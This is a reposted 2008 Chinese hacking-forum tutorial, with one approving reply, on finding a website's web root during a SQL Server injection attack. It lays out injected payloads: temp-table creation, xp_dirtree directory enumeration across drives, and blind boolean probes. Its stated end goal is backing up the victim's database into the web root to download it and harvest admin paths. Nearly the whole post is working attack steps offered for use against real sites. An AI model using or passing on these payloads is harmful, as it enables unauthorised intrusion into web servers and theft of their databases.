D0000D发往论坛板块-------------------------------------------------------
No2  号板块  技术文章
D8888D贴子标题-------------------------------------------------------
入侵中快速获得Web根目录的技巧
D8888D主贴内容-------------------------------------------------------
转载来源于开创网安 [url=http://bbs.16kc.net]链接标记http://bbs.16kc.net[/url] JHACKJ 2008最新打造
本文章针对以下环境，如果不符合以下的条件，就不适合用下面提到的方法来获得WEB根目录。   
  
1、SQL SERVER允许执行多行语句；   
2、该网站能进行注入；   
3、没有返回详细的错误提示信息(否则没有必要用这种方法)。   
  
  
根据经验，猜疑WEB根目录的顺序是：d盘、e盘、c盘，首先我们建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树,用以下语句：   
;create table temp(dir nvarchar(255),depth varchar(255));--,该表的dir字段表示目录的名称，depth字段表示目录的深度。然后执行xp_dirtree获得D盘的目录树，语句如下：   
;insert temp(dir,depth) exec master.dbo.xp_dirtree 'd:';--   
  
在进行下面的操作前，先查看D盘有几个文件夹，这样对D盘有个大致的了解，语句如下：   
and (select count(*) from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','   
  
WINDOWS','CAConfig','wmpub','Microsoft UAM 卷'))>=数字(数字=0、1、2、3...)   
  
接着，我们在对方的网站上找几个一级子目录，如user、photo，然后，用筛选的方法来判断WEB根目录上是否存在此盘上，语句如下：   
and (select count(*) from temp where dir<>'user')<(select count(*) from temp)   
  
看语句的返回结果，如果为真，表示WEB根目录有可能在此盘上，为了进一步确认，多测试几个子目录：   
and (select count(*) from temp where dir<>'photo')<(select count(*) from temp)   
  
...   
  
如果所有的测试结果都为真，表示WEB根目录很有可能在此盘上。   
  
下面假设找到的WEB根目录在此盘上，用以下的语句来获得一级子目录的深度：   
and (select depth from temp where dir='user')>=数字(数字=1、2、3...)   
  
假设得到的depth是3,说明user目录是D盘的3级目录，则WEB根目录是D盘的二级目录。   
  
目前我们已经知道了根目录所在的盘符和深度，要找到根目录的具体位置，我们来从D盘根目录开始逐一搜寻，当然，没有必要知道每个目录的名称，否则太耗费时间了。   
  
接下来，另外建立一个临时表，用来存放D盘的1级子目录下的所有目录，语句如下：   
  
;create table temp1(dir nvarchar(255),depth varchar(255));--   
  
然后把从D盘的第一个子目录下的所有目录存到temp1中，语句如下：   
declare @dirname varchar(255);set @dirname='d:\'+(select top 1 dir from (select top 1 dir from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information'   
  
,'WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp1 exec master.dbo.xp_dirtree @dirname   
当然也可以把D盘的第二个子目录下的所有目录存到temp1中，只需把第二个top 1改为top 2就行了。   
  
现在，temp1中已经保存了所有D盘第一级子目录下的所有目录,然后，我们用同样的方法来判断根目录是否在此一级子目录下：   
and (select count(*) from temp1 where dir<>'user')<(select count(*) from temp1)   
如果返回为真，表示根目录可能在此子目录下，记住要多测试几个例子，如果都返回为假，则表明WEB根目录不在此目录下，然后我们在用同样的方法来获得D盘第2、3...个子目录下的所有目录列表，来判断WEB根目录是否在其下。但是，要注意，用xp_dirtree前一定要把temp1表中的内容删除。   
  
现在假设，WEB根目录在D盘的第一级子目录下，该子目录名称为website,怎样获得这个目录的名称我想不用我说了吧。因为前面我们知道了WEB根目录的深度为2，我们需要知道website下到底哪个才是真正的WEB根目录。   
  
现在，我们用同样的方法，再建立第3个临时表：   
;create table temp2(dir nvarchar(255),depth varchar(255));--   
  
然后把从D盘的website下的所有目录存到temp2中，语句如下：   
declare @dirname varchar(255);set @dirname='d:\website\'+(select top 1 dir from (select top 1 dir from temp1 where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information'   
  
,'WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp2 exec master.dbo.xp_dirtree @dirname   
当然也可以把D盘的website下第二个子目录下的所有目录存到temp2中，只需把第二个top 1改为top 2就行了。   
  
现在，我们用同样的方法判断该目录是否为根目录：   
and (select count(*) from temp2 where dir<>'user')<(select count(*) from temp2)   
如果返回为真，为了确定我们的判断，多测试几个例子，方法上面都讲到了，如果多个例子都返回为真，那么就确定了该目录为WEB根目录。   
  
用以上的方法基本上可以获得WEB根目录，现在我们假设WEB根目录是：D:\website\www   
然后，我们就可以备份当前数据库到这个目录下用来下载。备份前我们把temp、temp1、temp2的内容清空，然后C、D、E盘的目录树分别存到temp、temp1、temp2中。   
  
下载完数据库后要记得把三个临时表DROP掉，现在我们在下载的数据库中可以找到所有的目录列表，包括后台管理的目录以及更多信息。

D8888D回贴内容-------------------------------------------------------
方法不错，学习了。有些符号被htmlencode了，楼主处理下吧
